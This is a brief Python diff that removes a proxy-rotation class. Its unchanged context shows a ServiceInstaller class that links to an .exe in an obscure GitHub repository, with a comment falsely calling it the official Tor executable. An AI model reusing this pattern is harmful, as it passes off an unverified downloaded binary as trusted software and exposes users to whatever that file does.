@@ -4,21 +4,6 @@ import tempfile
 import subprocess
 import psutil
 
-class ProxyRotator:
-    current_irt = 1
-        
-    def __init__(self, proxies):
-        self.proxies = proxies
-        self.current = proxies[0]
-        
-    def next(self):
-        if self.proxies[-1] == self.current:
-            self.current = self.proxies[0]
-            self.current_irt = 1
-        else:
-            self.current = self.proxies[self.current_irt]
-            self.current_irt += 1
-
 class ServiceInstaller:
     service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"    # THIS IS THE OFFICIAL TOR EXECUTABLE
     
